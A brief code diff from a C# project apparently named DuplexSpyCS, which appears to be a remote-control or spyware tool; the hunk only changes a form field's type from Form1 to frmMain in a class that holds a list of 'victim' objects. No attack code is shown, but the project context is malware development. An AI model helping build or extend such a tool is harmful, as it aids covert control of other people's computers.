@@ -13,7 +13,7 @@ namespace DuplexSpyCS
     public partial class frmClntSleep : Form
     {
         public List<clsVictim> m_lsVictim;
-        public Form1 frmMain;
+        public frmMain frmMain;
 
         public frmClntSleep()
         {
